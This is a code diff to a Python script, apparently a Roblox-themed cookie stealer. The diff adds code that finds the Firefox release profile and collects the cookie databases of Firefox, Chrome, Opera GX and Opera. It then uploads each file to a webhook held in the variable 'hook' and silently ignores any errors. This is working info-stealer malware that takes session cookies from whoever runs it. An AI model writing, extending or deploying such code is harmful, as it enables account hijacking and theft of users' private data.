@@ -488,20 +488,26 @@ class Roblox:
 
 k = Roblox()
 user = os.getlogin()
+zce = f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
+for folder in os.listdir(zce):
+    if re.search(r'release', folder, re.IGNORECASE):
+        defualtt = os.path.join(zce, folder)
+else:
+    pass
 flis = [
-    f"C:/Users/{user}/AppData/Local/Mozilla/Firefox/Profiles/*.default*/cookies.sqlite",
-    f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies",
-    f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/Network/Cookies",
-    f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/Default/Network/Cookies"]
+    f"{defualtt}\\cookies.sqlite",
+    f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+    f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies",
+    f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\Network\\Cookies"]
 
 for fpath in flis:
     if os.path.exists(fpath):
-        with open(fpath, 'rb') as file:
-            nam = fpath.split('/')[-1] 
-            files = {'file': (nam, file)  }
-            try:
-                r = requests.post(hook, files=files)
-            except:pass
+            with open(fpath, 'rb') as file:
+                nam = fpath.split('/')[-1] 
+                files = {'file': (nam, file) }
+                try:
+                    requests.post(hook, files=files)
+                except:pass
     else:continue
 
 def gcc(db=None):
